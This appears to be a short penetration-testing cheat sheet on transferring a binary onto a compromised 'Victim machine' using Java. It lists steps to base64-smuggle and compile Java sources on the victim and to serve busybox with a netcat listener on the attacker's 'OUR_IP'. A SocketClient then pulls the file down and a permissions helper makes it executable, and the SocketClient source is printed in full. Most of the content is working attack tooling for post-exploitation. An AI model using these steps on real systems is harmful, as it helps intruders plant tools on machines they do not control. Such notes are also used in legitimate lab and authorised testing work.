## File transfer with Java

#### 1) Generate 

    base64 SocketClient.java

#### 2) 

    echo "BASE64ENCODED" | base64 -d > SocketClient.java (Victim machine)

#### 3) 

    javac SocketClient.java 

#### 4) 

    base64 FilePermissions.java

#### 5)  

    echo "BASE64ENCODED" | base64 -d > FilePermissions.java (Victim machine)

#### 6) 

    javac FilePermissions.java

#### 7) 

    nc -lvnp 5555 < busybox

#### 8) 

    java SocketClient OUR_IP 5555 > busybox (Victim machine)

#### 9) 

    java FilePermissions (Give busybox permissions to execute)

## Java Files

### SocketClient.java

    import java.io.*;
    import java.net.*;
    public class SocketClient {
    public static void main(String args[]) {
          Socket socket = null;
          DataInputStream inputStream = null;
    try {
             socket = new Socket(args[0], Integer.valueOf(args[1]));
             inputStream = new DataInputStream(socket.getInputStream());
          }
          catch (Exception e) {
             System.err.println(e);
          }
    while (true) {
             try {
                byte[] bytes = new byte[4096];
                int length = inputStream.read(bytes);
                if (length < 0) {
                   break;
                }
                System.out.write(bytes, 0, length);
             }
             catch(Exception e) {
                System.err.println(e);
                break;
             }
          }
    try {
             inputStream.close();
             socket.close();
          }
          catch(IOException e) {
             System.err.println(e);
          }
       }
    }
